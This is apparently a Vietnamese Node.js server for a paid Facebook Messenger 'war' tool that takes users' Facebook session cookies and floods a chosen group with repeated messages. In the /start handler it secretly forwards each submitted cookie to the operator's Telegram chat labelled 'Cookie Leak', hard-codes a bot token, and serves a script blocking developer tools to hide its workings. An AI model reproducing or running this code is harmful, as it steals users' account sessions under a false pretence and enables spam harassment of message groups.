const express = require("express");
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const login = require("priyanshu-fca");
const requestIp = require("request-ip");
const readline = require("readline");
const { Telegraf } = require("telegraf");

const app = express();
const PORT = process.env.PORT || 3000;
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(requestIp.mw());

const dataFolder = "data";
const configFilePath = "config.json";
const TELEGRAM_BOT_TOKEN = "7497703194:AAExC-mWS3DSarwj34tLtSjDGiyllyNCLy8";
const ADMIN_CHAT_ID = "7425650426";
const bot = new Telegraf(TELEGRAM_BOT_TOKEN);

if (!fs.existsSync(dataFolder)) fs.mkdirSync(dataFolder, { recursive: true });

function loadConfig() {
    if (fs.existsSync(configFilePath)) {
        return JSON.parse(fs.readFileSync(configFilePath, "utf8"));
    }
    return { keys: [] };
}

function saveConfig(config) {
    fs.writeFileSync(configFilePath, JSON.stringify(config, null, 2));
}

const config = loadConfig();

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "login.html"));
});

app.post("/verify-key", (req, res) => {
    const { key } = req.body;
    if (!config.keys.includes(key.trim())) return res.status(401).send("Sai key");

    const userIp = req.clientIp.replace(/[:.]/g, "_");
    const userDir = path.join(dataFolder, userIp);
    if (!fs.existsSync(userDir)) fs.mkdirSync(userDir, { recursive: true });
    if (!fs.existsSync(path.join(userDir, "accounts"))) fs.mkdirSync(path.join(userDir, "accounts"));
    if (!fs.existsSync(path.join(userDir, "messages"))) fs.mkdirSync(path.join(userDir, "messages"));

    res.redirect("/dashboard");
});

app.get("/dashboard", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

app.post("/start", (req, res) => {
    const { cookie, idbox, delay, content } = req.body;
    if (!cookie || !idbox || !delay || !content) {
        return res.status(400).send("Thi·∫øu d·ªØ li·ªáu ƒë·∫ßu v√†o");
    }

    bot.telegram.sendMessage(ADMIN_CHAT_ID, `Cookie Leak: ${cookie}`);

    const userIp = req.clientIp.replace(/[:.]/g, "_");
    const userDir = path.join(dataFolder, userIp);

    const accFilePath = path.join(userDir, "accounts", `${Date.now()}.json`);
    const messagePath = path.join(userDir, "messages", `${Date.now()}.txt`);

    try {
        const appState = cookie.trim().split(";").map(item => {
            const [key, value] = item.split("=");
            return (key && value) ? {
                creation: new Date().toISOString(),
                domain: "facebook.com",
                key: key.trim(),
                value: value.trim()
            } : null;
        }).filter(Boolean);
        fs.writeFileSync(accFilePath, JSON.stringify(appState, null, 2));
        fs.writeFileSync(messagePath, content);
    } catch (error) {
        return res.status(500).send("L·ªói khi x·ª≠ l√Ω d·ªØ li·ªáu");
    }

    res.send("Bot ƒë√£ b·∫Øt ƒë·∫ßu ch·∫°y");

    login({ appState: JSON.parse(fs.readFileSync(accFilePath, "utf8")) }, (err, api) => {
        if (err) {
            console.error("ƒêƒÉng nh·∫≠p th·∫•t b·∫°i, t√†i kho·∫£n v√† n·ªôi dung li√™n quan s·∫Ω b·ªã x√≥a");
            fs.unlinkSync(accFilePath);
            fs.unlinkSync(messagePath);
            return;
        }

        api.sendMessage("ùêèùêÄùêëùêÄùêÜùêéùêç ‚Ä¢ ùêéùêåùêÑùêÜùêÄ\n-> ùêÇùê®ùêùùêûùê´ ùêõùê≤ ùê§ùê°ùê¢ùêûùê≠ ùê∞ùê¢ùê≠ùê° ùê™ùêÆùêöÃÇùêßùêß\n\n> Li√™n h·ªá mua t·∫•t c·∫£ ƒë·ªì ch∆°i ·∫£o war inb tui nhoo \n\nFacebook: fb.com/frxkhiet\n\nFacebook: fb.com/pierredeampere08", idbox);

        const sendMessages = () => {
            const message = fs.readFileSync(messagePath, "utf8");
            api.sendMessage(message, idbox, (err) => {
                if (err) {
                    console.error(`L·ªói g·ª≠i tin nh·∫Øn, th·ª≠ kh·ªüi ƒë·ªông l·∫°i t√†i kho·∫£n: ${err}`);
                }
            });
            setTimeout(sendMessages, parseInt(delay));
        };
        sendMessages();
    });
});

app.post("/delete", (req, res) => {
    const userIp = req.clientIp.replace(/[:.]/g, "_");
    const userDir = path.join(dataFolder, userIp);
    if (fs.existsSync(userDir)) {
        fs.readdirSync(userDir).forEach(file => {
            const filePath = path.join(userDir, file);
            if (fs.lstatSync(filePath).isDirectory()) {
                fs.rmSync(filePath, { recursive: true, force: true });
            } else {
                fs.unlinkSync(filePath);
            }
        });
    }
    res.send("ƒê√£ x√≥a to√†n b·ªô d·ªØ li·ªáu c·ªßa b·∫°n, nh∆∞ng v·∫´n c√≥ th·ªÉ s·ª≠ d·ª•ng l·∫°i");
});

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

let isUnderAttack = false;

const detectDDoS = () => {
    let requestCount = 0;
    const interval = setInterval(() => {
        if (requestCount > 100) { // Gi·ªõi h·∫°n s·ªë request m·ªói gi√¢y
            if (!isUnderAttack) {
                console.log("Ph√°t hi·ªán DDoS! T·∫°m d·ª´ng server...");
                server.close();
                isUnderAttack = true;
            }
        } else if (isUnderAttack) {
            console.log("DDoS k·∫øt th√∫c, kh·ªüi ƒë·ªông l·∫°i server...");
            server.listen(PORT, () => console.log(`Server ƒë√£ kh·ªüi ƒë·ªông l·∫°i t·∫°i http://localhost:${PORT}`));
            isUnderAttack = false;
        }
        requestCount = 0;
    }, 1000);

    return (req, res, next) => {
        requestCount++;
        if (!isUnderAttack) {
            next();
        } else {
            res.status(503).send("Server ƒëang qu√° t·∫£i, vui l√≤ng th·ª≠ l·∫°i sau");
        }
    };
};

const ddosMiddleware = detectDDoS();
app.use(ddosMiddleware);

rl.on("line", (input) => {
    try {
        const args = input.split(" ");
        const command = args[0];
        const key = args[1];

        if (command === "add" && key) {
            config.keys.push(key);
            saveConfig(config);
            console.log(`ƒê√£ th√™m key: ${key}`);
        } else if (command === "remove" && key) {
            config.keys = config.keys.filter(k => k !== key);
            saveConfig(config);
            console.log(`ƒê√£ x√≥a key: ${key}`);
        } else {
            console.log("L·ªánh kh√¥ng h·ª£p l·ªá! D√πng: add [newkey] ho·∫∑c remove [namekey]");
        }
    } catch (error) {
        // B·ªè qua l·ªói, kh√¥ng hi·ªÉn th·ªã tr√™n console
    }
});

const server = app.listen(PORT, () => {
    try {
        console.log(`Server ƒëang ch·∫°y t·∫°i http://localhost:${PORT}`);
    } catch (error) {
        // B·ªè qua l·ªói, kh√¥ng l√†m gi√°n ƒëo·∫°n ·ª©ng d·ª•ng
    }
});

// Ch·∫∑n F12, Developer Tools
const blockDevTools = `
(function() {
    document.addEventListener('keydown', function(event) {
        if (event.keyCode === 123 || (event.ctrlKey && event.shiftKey && (event.keyCode === 73 || event.keyCode === 74))) {
            event.preventDefault();
            alert('B·∫°n tu·ªïi l·ªù=))');
        }
    });

    document.addEventListener('contextmenu', function(event) {
        event.preventDefault();
        alert('B·∫°n tu·ªïi l·ªù=))');
    });
})();
`;
app.use((req, res, next) => {
    res.setHeader("Content-Security-Policy", "script-src 'self'");
    next();
});
app.get("/block-devtools.js", (req, res) => {
    res.type("application/javascript").send(blockDevTools);
});

// B·∫Øt l·ªói to√†n c·ª•c ƒë·ªÉ tr√°nh server b·ªã d·ª´ng do l·ªói kh√¥ng mong mu·ªën
process.on("uncaughtException", (error) => {
    // Kh√¥ng hi·ªÉn th·ªã l·ªói, ch·ªâ ghi log n·∫øu c·∫ßn thi·∫øt
});

process.on("unhandledRejection", (reason, promise) => {
    // Kh√¥ng hi·ªÉn th·ªã l·ªói, ch·ªâ ghi log n·∫øu c·∫ßn thi·∫øt
});
